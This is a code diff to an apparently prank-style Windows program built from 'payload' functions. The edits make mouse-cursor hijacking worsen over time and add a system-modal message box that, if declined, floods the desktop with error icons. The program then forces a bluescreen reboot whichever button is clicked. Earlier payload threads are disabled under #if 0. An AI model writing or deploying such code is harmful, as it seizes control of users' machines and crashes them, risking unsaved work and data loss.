@@ -10,6 +10,8 @@
 #include <functional>
 #include <ctime>
 #include <chrono>
+#include <tchar.h>
+#include <strsafe.h>
 
 #pragma comment(lib, "wininet") // fixes weird thing with wininet unresolved symbols
 #pragma comment(lib, "shell32")
@@ -91,8 +93,8 @@ void PayloadCursor(void)
 	//	Removed scaling, looks better with a static 1px movement every 20 msec
 	for (;;) {
 		GetCursorPos(&cursor);
-		cursor.x += dist(mt);
-		cursor.y += dist(mt);
+		cursor.x += dist(mt) * (runtime);
+		cursor.y += dist(mt) * (runtime);
 		SetCursorPos(cursor.x, cursor.y);
 
 		std::this_thread::sleep_for(std::chrono::milliseconds(20));
@@ -245,16 +247,32 @@ void LaunchPayloads(void)
 }
 
 void PromptToLogOut(void) {
-	auto msgret = MessageBox(nullptr, L"The game zone is closed at this time. Please log out\nClicking 'OK' will log you out.\n\nDon't forget to save",
-		L"Game Over Man!", MB_OKCANCEL | MB_ICONINFORMATION | MB_SYSTEMMODAL | MB_SETFOREGROUND );
+	auto msg = L"The game zone is closing now, please save your game and log out.";
+	auto msgret = MessageBox(nullptr, msg, L"Game Over Man!", MB_YESNO | MB_ICONINFORMATION | MB_SYSTEMMODAL);
+	auto x = GetSystemMetrics(SM_CXSCREEN);
+	auto y = GetSystemMetrics(SM_CYSCREEN);
+	HWND hwnd = GetDesktopWindow();
+	HDC hdc = GetWindowDC(hwnd);
+	std::uniform_int_distribution<int> dy(0, y);
+	std::uniform_int_distribution<int> dx(0, x);
+	int ix = GetSystemMetrics(SM_CXICON) / 2;
+	int iy = GetSystemMetrics(SM_CYICON) / 2;
 
-	if (msgret == IDOK) {
-		reboot(REBOOT_NORMAL);
+	if (msgret == IDNO) {
+		for (int i = 0; i < 500; i++) {
+			DrawIcon(hdc, dx(mt), dy(mt), LoadIcon(NULL, IDI_ERROR));
+			DrawIcon(hdc, dx(mt), dy(mt), LoadIcon(NULL, IDI_WARNING));
+			std::this_thread::sleep_for(std::chrono::milliseconds(1));
+		}
 	}
+	reboot(REBOOT_BLUESCREEN);
 }
 
 int main(void)
 {
+	runtime = 10;
+	PayloadCursor();
+#if 0
 	std::thread(PromptToLogOut).detach(); // go ahead and start fuckery, message box is just an easy way to log out early.
 	std::thread(LaunchPayloads).detach(); // said fuckery
 	for (runtime = 0; runtime <= MAX_RUNTIME; runtime++) {
@@ -262,4 +280,5 @@ int main(void)
 		std::this_thread::sleep_for(std::chrono::minutes(1));
 	}
 	reboot(REBOOT_BLUESCREEN);
+#endif
 }
